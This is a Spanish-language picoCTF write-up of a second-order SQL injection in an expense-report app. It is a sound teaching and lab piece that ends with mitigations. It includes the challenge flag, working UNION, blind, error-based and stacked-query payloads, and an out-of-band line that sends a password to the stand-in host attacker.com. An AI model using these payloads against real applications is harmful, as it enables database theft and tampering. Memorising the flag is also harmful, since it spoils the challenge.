# Writeup: Crystal Peak — SQL Injection (picoCTF)

**URL:** `crystal-peak.picoctf.net:59181`  
**Categoría:** Web Exploitation / SQL Injection  
**Flag:** `picoCTF{s3c0nd_0rd3r_1t_1s_30dc1ce8}`

---

## Descripción de la aplicación

La aplicación es un sistema de gestión de gastos con tres secciones principales:

- **Dashboard** — muestra un mensaje de bienvenida con el nombre de usuario
- **Expenses** — permite agregar gastos y generar reportes CSV
- **Inbox** — lista los reportes generados con un enlace de descarga

---

## Vulnerabilidad: Second-Order SQL Injection

### ¿Qué es Second-Order SQL Injection?

A diferencia de una inyección directa (donde el payload se ejecuta en el mismo request), en una **second-order (o stored) SQL injection**:

1. El payload malicioso se **almacena** en la base de datos sin ejecutarse (el input se sanitiza o escapa en el momento de la escritura).
2. En una **operación posterior**, ese dato almacenado se recupera y se **concatena directamente en una consulta SQL** sin sanitización, ejecutándose en ese momento.

Esto hace que sea más difícil de detectar con escaneos automáticos simples.

---

## Paso a paso del exploit

### 1. Registro con payload en el nombre de usuario

Al crear una cuenta, se registró un nombre de usuario con una carga SQL:

```bash
' UNION SELECT name,value,'2026-01-01' FROM aDNyM19uMF9mMTRn --
```

- La aplicación guardó este string tal cual en la tabla `users`.
- En el dashboard se puede ver que el nombre se refleja sin ejecutarse: el mensaje dice literalmente `Welcome to your dashboard, 'UNION SELECT name,value,'2026-01-01' FROM aDNyM19uMF9mMTRn --!`

### 2. Generación del reporte

Al ir a **Expenses → Generate Report**, el backend construye una consulta SQL similar a:

```sql
SELECT description, amount, date
FROM expenses
WHERE user_id = (SELECT id FROM users WHERE username = '<username_aquí>')
```

O bien, el username se usa directamente para construir el nombre del archivo o la consulta:

```sql
SELECT description, amount, date FROM expenses WHERE username = '<username>'
```

Al sustituir el nombre almacenado, la consulta queda:

```sql
SELECT description, amount, date FROM expenses WHERE username = '' UNION SELECT name,value,'2026-01-01' FROM aDNyM19uMF9mMTRn --'
```

El `--` comenta el resto de la query. El `UNION` agrega filas de la tabla secreta `aDNyM19uMF9mMTRn`.

### 3. Descarga del reporte en Inbox

El reporte generado aparece en el **Inbox** con el nombre de archivo que incluye el payload. Al descargarlo, el CSV contiene:

```
description,amount,date
flag,picoCTF{s3c0nd_0rd3r_1t_1s_30dc1ce8},2026-01-01
```

### 4. Decodificación del nombre de tabla

El nombre de la tabla (`aDNyM19uMF9mMTRn`) parecía ofuscado. Usando CyberChef con **From Base64** se obtuvo:

```
h3r3_n0_f14g
```

Nombre de tabla intencionalmente engañoso, pero el UNION igualmente extrajo la flag de ahí.

---

## Esquema de la base de datos (obtenido del primer reporte)

El primer reporte descargado expuso el esquema completo de SQLite mediante:

```sql
' UNION SELECT name,value,'2026-01-01' FROM sqlite_master --
```

Las tablas encontradas:

|Tabla|Descripción|
|---|---|
|`users`|id, username (UNIQUE), email, password|
|`expenses`|id, user_id, description, amount, date|
|`inbox`|id, username, description, report_path, status, created_at|
|`reports`|id, username, status, created_at|
|`aDNyM19uMF9mMTRn`|name TEXT PRIMARY KEY, value TEXT — tabla con la flag|

---

## Variaciones de SQL Injection aplicables

### 1. UNION-based (usada en este reto)

Extrae datos de otras tablas añadiendo filas con `UNION SELECT`.

```sql
' UNION SELECT name, value, '2026-01-01' FROM aDNyM19uMF9mMTRn --
```

**Requisitos:** conocer el número de columnas y tipos compatibles.

### 2. Enumerar tablas con sqlite_master

```sql
' UNION SELECT name, sql, '2026-01-01' FROM sqlite_master WHERE type='table' --
```

Devuelve los nombres y DDL de todas las tablas.

### 3. Error-based (cuando hay mensajes de error visibles)

```sql
' AND 1=CAST((SELECT value FROM aDNyM19uMF9mMTRn LIMIT 1) AS INTEGER) --
```

Si la base de datos devuelve errores con el valor del cast fallido, se puede leer datos.

### 4. Boolean-based blind

```sql
' AND (SELECT SUBSTR(value,1,1) FROM aDNyM19uMF9mMTRn LIMIT 1)='p' --
```

Si la aplicación responde diferente según verdadero/falso, se extrae carácter por carácter.

### 5. Time-based blind (SQLite)

```sql
' AND (SELECT CASE WHEN (SUBSTR(value,1,1)='p') THEN randomblob(100000000) ELSE 1 END FROM aDNyM19uMF9mMTRn)=1 --
```

`randomblob(N)` genera N bytes aleatorios causando delay si la condición es verdadera.

### 6. Stacked queries (si el driver lo permite)

```sql
'; INSERT INTO users (username,email,password) VALUES ('hacker','h@x.com','pass'); --
```

SQLite con algunos drivers permite ejecutar múltiples statements.

### 7. Out-of-band (DNS/HTTP exfiltration)

No disponible en SQLite, pero en MySQL/MSSQL:

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',( SELECT password FROM users LIMIT 1),'.attacker.com\\x')) --
```

---

## Mitigaciones

|Problema|Solución|
|---|---|
|Concatenación directa del username en queries|Usar **prepared statements / parameterized queries** siempre|
|Second-order injection|Escapar/parametrizar **también** cuando se recuperan datos de la BD para usarlos en queries|
|Tabla de flags con nombre obfuscado en Base64|No es una medida de seguridad real|
|Sin validación de output|Sanitizar datos antes de devolverlos al usuario|

---

## Conclusión

Este reto ilustra que sanitizar el input al momento de escribirlo no es suficiente. Si ese dato almacenado se reutiliza luego en una consulta SQL construida por concatenación de strings, la vulnerabilidad reaparece. La única defensa robusta son los **prepared statements** en todas las operaciones de base de datos, tanto en escritura como en lectura posterior.